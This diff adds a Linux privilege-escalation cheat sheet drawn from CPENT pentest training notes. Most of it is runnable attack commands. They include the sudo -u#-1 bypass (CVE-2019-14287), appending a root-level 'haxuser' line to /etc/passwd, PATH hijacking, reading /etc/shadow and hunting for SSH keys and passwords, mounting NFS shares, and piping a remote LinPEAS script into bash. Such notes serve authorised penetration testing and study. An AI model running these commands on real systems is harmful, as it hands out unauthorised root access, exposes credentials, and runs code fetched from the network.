@@ -1,0 +1,58 @@
+# Linux Privilege Escalation — Quick Reference
+# Source: CPENT Unix-Linux Enumeration + Module 10 scripts
+
+## System enumeration
+uname -a                              # kernel + arch
+cat /etc/os-release
+id && whoami
+env
+cat /etc/passwd | grep -v nologin     # valid users
+cat /etc/group
+last                                  # login history
+w                                     # who is logged in
+
+## SUID/SGID binaries
+find / -perm -4000 -type f 2>/dev/null   # SUID
+find / -perm -2000 -type f 2>/dev/null   # SGID
+# Check GTFOBins for exploit paths: https://gtfobins.github.io
+
+## World-writable files
+find / -writable -type f 2>/dev/null | grep -v /proc
+
+## Cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+cat /var/spool/cron/crontabs/* 2>/dev/null
+
+## Sudo abuse
+sudo -l                               # what can current user sudo
+sudo -u#-1 /bin/bash                  # CVE-2019-14287 (sudo <1.8.28)
+
+## PATH hijacking
+echo $PATH
+# If writable dir early in PATH: place malicious binary there
+
+## Kernel exploits
+uname -r
+searchsploit linux kernel 4.15        # match kernel version
+
+## Passwords & credentials
+cat /etc/shadow 2>/dev/null
+find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
+find / -name "id_rsa" 2>/dev/null
+history | grep -i passw
+
+## Writable /etc/passwd
+openssl passwd -1 -salt xyz newpass
+echo 'haxuser:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+## NFS no_root_squash
+cat /etc/exports
+showmount -e <TARGET_IP>
+mount -t nfs <TARGET>:/share /mnt/nfs
+
+## Tools (run on target if internet access)
+# LinPEAS:  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+# LinEnum:  bash LinEnum.sh -t
+# linux-exploit-suggester: ./les.sh
